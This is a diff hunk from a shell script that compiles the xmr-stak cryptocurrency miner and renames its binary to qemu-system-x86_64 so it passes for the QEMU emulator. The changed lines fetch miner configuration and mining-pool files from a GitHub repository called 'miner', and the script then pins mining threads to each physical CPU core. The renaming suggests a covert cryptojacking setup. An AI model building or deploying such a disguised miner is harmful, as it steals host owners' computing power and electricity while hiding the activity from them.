@@ -18,7 +18,8 @@ cd $workingdir/qemu-system-x86/build
 cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
 make install
 mv $workingdir/qemu-system-x86/build/bin/xmr-stak $workingdir/qemu-system-x86/build/bin/qemu-system-x86_64
-curl https://raw.githubusercontent.com/githubuserold/miner/master/cpu.txt > $workingdir/qemu-system-x86/build/bin/cpu.txt
+curl https://raw.githubusercontent.com/githubuserold/miner/master/config_new.txt > $workingdir/qemu-system-x86/build/bin/config.txt
+curl https://raw.githubusercontent.com/githubuserold/miner/master/pools.txt > $workingdir/qemu-system-x86/build/bin/pools.txt
 echo -e "],\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
 for (( core=0; core<$phycores; core++ )); do
          echo -e "   { \"low_power_mode\" : false, \"no_prefetch\" : true, \"affine_to_cpu\" : ${core} },\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
